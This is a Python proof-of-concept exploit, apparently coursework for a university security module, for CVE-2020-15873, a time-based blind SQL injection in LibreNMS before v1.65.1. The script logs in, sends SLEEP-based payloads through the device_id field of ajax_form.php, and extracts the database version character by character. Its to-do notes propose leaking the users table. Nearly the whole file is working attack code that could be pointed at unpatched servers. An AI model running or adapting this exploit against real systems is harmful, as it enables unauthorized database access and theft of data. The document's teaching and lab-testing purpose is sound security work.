'''

Module: CS4239
Semester: AY2021 Semester 1


Poc of CVE-2020-15873 - Blind SQL Injection in Librenms < v1.65.1


Authors:
1. ANG Chin Guan, Melvin
2. CHEAH Zhi Kang
3. LEE Bo Qiang
4. POH Jia Hao
5. TAN Wei Sheng, Jerome


Pre-req:

1. Docker container running Libre v1.65 and below
2. Login as librenms:librenms
3. Create a device using the GUI, set the host to '127.0.0.1'.
4. Run this script: python poc.py <ip addr:8000> librenms librenms

'''


'''

To-do:

1. Convert the format strings from % to {}.format()
2. Add more queries, for example, SELECT LENGTH(version()) to obtain the length dynamically instead of hardcoding to 37.
3. Any other queries that showcase compromise, maybe just leak the only default row in `users` table.
4. ...

'''

import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()

# Burp is assumed to be listening on port 8080.
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def sqli(ip, inj_str):
    for j in range(32, 126):
        target = "http://%s/ajax_form.php" % sys.argv[1]
        p_data = {"action": "test", "type": "customoid", "device_id": inj_str.replace("[CHAR]", str(j))}
        r = s.post(target, data=p_data)
        # Uncomment the line below to debug using Burp
        #r = s.post(target, data=p_data, proxies=proxies)
        # Uncomment the line below to see what is being sent to the server
        #print r.text
        if (round(r.elapsed.total_seconds()) > 3):
            return j
    return None

def main():
    ip = sys.argv[1]
    print "(+) Retrieving database version...."
    for i in range(1, 37):
        injection_string ="1 AND IF(ASCII(SUBSTRING((SELECT version()),%d,1))=[CHAR],sleep(4),'a');-- -" % i
        extracted_char = chr(sqli(ip, injection_string))
        sys.stdout.write(extracted_char) # displaying data
        sys.stdout.flush()
    print "\n(+) done!"

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "(+) usage: %s <target> <username> <password>" % sys.argv[0]
        print '(+) eg: %s domain/ip username password' % sys.argv[0]
        sys.exit(-1)

    login_url = "http://%s/login" % sys.argv[1]
    response = s.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    _token = soup.find('input')['value'] 
    username = sys.argv[2]
    password = sys.argv[3]
    login_data = {"_token": _token, "username": username, "password": password, "remember": "on", "submit":""}
    login = s.post(login_url, data=login_data)
    main()
